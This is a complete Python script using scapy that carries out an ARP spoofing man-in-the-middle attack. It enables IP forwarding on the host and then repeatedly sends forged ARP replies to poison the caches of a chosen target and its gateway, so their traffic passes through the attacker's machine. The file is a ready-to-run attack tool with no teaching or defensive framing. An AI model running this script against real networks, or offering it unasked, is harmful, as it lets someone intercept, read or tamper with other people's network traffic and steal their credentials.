import scapy.all as scapy
import time
import optparse as opt
import subprocess as sub

# Retrieves the MAC address for a given IP address using ARP requests.
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if len(answered) == 0:
        print(f"[!] Could not get MAC address for {ip}!")
        return None

    return answered[0][1].hwsrc

# Parses user input from the command line for target and gateway IP addresses.
def get_user_input():
    parser = opt.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip")
    parser.add_option("-g", "--gateway", dest="gateway_ip")    

    options = parser.parse_args()[0]

    if not options.target_ip:
        print("Please enter the Target IP.")
    
    if not options.gateway_ip:
        print("Please enter the Gateway IP.")
    
    return options

# Sends a spoofed ARP response to the target, poisoning its ARP cache.
def arp_poison(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac is None:
        print(f"[!] Cannot perform ARP poisoning for {target_ip}.")
        return

    # Create a fake ARP response associating the spoofed IP with the attacker's MAC address.
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = scapy.Ether(dst=target_mac)
    packet = ether / arp_response
    scapy.sendp(packet, verbose=False)

# Restores the original ARP table entries for the victim and gateway.
def restore_arp(victim_ip, gateway_ip):
    victim_mac = get_mac_address(victim_ip)
    gateway_mac = get_mac_address(gateway_ip)
    if victim_mac is None or gateway_mac is None:
        print("[!] Could not get MAC addresses, skipping restore operation.")
        return

    # Send the correct ARP response to restore the ARP table.
    arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    ether = scapy.Ether(dst=victim_mac)
    packet = ether / arp_response
    scapy.sendp(packet, verbose=False, count=5)

# Enables IP forwarding on the attacker's machine to allow packet forwarding.
def enable_ip_forwarding():
    sub.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

# Main function to coordinate the ARP spoofing attack.
def main():
    enable_ip_forwarding()
    packet_count = 0
    user_options = get_user_input()
    target_ip = user_options.target_ip
    gateway_ip = user_options.gateway_ip

    try:
        while True:
            # Poison both the target and the gateway.
            arp_poison(target_ip, gateway_ip)
            arp_poison(gateway_ip, target_ip)

            packet_count += 2

            print(f"\r{packet_count} packets sent", end="")

            time.sleep(3)

    except KeyboardInterrupt:
        print("\nQuitting...")
        # Restore ARP tables when the attack is stopped.
        restore_arp(target_ip, gateway_ip)
        restore_arp(gateway_ip, target_ip)

main()